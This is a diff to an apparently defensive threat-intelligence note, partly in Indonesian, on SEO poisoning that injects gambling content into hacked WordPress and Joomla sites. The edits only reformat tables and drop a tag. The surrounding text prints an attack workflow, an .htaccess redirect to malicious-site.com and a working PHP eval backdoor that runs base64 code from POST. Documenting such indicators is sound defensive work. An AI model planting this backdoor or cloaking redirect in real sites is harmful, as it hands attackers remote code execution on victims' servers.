@@ -4,25 +4,25 @@
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
-│                    SEO POISONING WORKFLOW                        │
+│ SEO POISONING WORKFLOW │
 ├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  1. INITIAL ACCESS                                               │
-│     ├── Exploited plugin/theme (WordPress, Joomla)               │
-│     ├── Brute force / credential stuffing                        │
-│     └── Vulnerable file upload functionality                     │
-│                                                                  │
-│  2. PERSISTENCE                                                  │
-│     ├── .htaccess manipulation (mod_rewrite rules)               │
-│     ├── Backdoor PHP (base64_decode, eval, preg_replace)         │
-│     ├── Cron job / scheduled task injection                      │
-│     └── Database injection (auto-load, hook)                     │
-│                                                                  │
-│  3. SEO CLOAKING                                                │
-│     ├── Detect Googlebot UA → serve gambling content              │
-│     ├── Detect normal user → serve legitimate content             │
-│     └── Hide evidence via iframe/JS obfuscation                  │
-│                                                                  │
+│ │
+│ 1. INITIAL ACCESS │
+│ ├── Exploited plugin/theme (WordPress, Joomla) │
+│ ├── Brute force / credential stuffing │
+│ └── Vulnerable file upload functionality │
+│ │
+│ 2. PERSISTENCE │
+│ ├── .htaccess manipulation (mod_rewrite rules) │
+│ ├── Backdoor PHP (base64_decode, eval, preg_replace) │
+│ ├── Cron job / scheduled task injection │
+│ └── Database injection (auto-load, hook) │
+│ │
+│ 3. SEO CLOAKING │
+│ ├── Detect Googlebot UA → serve gambling content │
+│ ├── Detect normal user → serve legitimate content │
+│ └── Hide evidence via iframe/JS obfuscation │
+│ │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -65,13 +65,13 @@ gzinflate(base64_decode(...));
 
 ```
 ┌──────────────────────┬─────────────────────┬─────────────────────┐
-│      Aspek           │    Googlebot访问     │   User Biasa        │
+│ Aspek │ Googlebot访问 │ User Biasa │
 ├──────────────────────┼─────────────────────┼─────────────────────┤
-│ Content served       │ Gambling keywords    │ Konten legitimate   │
-│ Meta tags            │ Hidden spam links    │ Normal meta         │
-│ Robots.txt           │ Allowed full crawl   │ Mungkin diblock     │
-│ Sitemap inclusion    │ URL judol di-sitemap │ Tidak ada visible   │
-│ JavaScript execution │ Minimal/None        │ Full execution      │
+│ Content served │ Gambling keywords │ Konten legitimate │
+│ Meta tags │ Hidden spam links │ Normal meta │
+│ Robots.txt │ Allowed full crawl │ Mungkin diblock │
+│ Sitemap inclusion │ URL judol di-sitemap │ Tidak ada visible │
+│ JavaScript execution │ Minimal/None │ Full execution │
 └──────────────────────┴─────────────────────┴─────────────────────┘
 ```
 
@@ -91,7 +91,7 @@ RewriteRule ^(.*)$ https://malicious-site.com/ [R=301,L]
 ```php
 // Hidden eval backdoor
 if (isset($_GET['theme']) && $_GET['theme'] === 'activate') {
-    @eval(base64_decode($_POST['code']));
+ @eval(base64_decode($_POST['code']));
 }
 ```
 
@@ -118,4 +118,4 @@ Casino777 | Judi Online | Bandar Slot | Jackpot Slot
 
 ## Tags
 
-#ioc #seo-poisoning #cloaking #backdoor #malware-indicators
+#ioc #cloaking #backdoor #malware-indicators
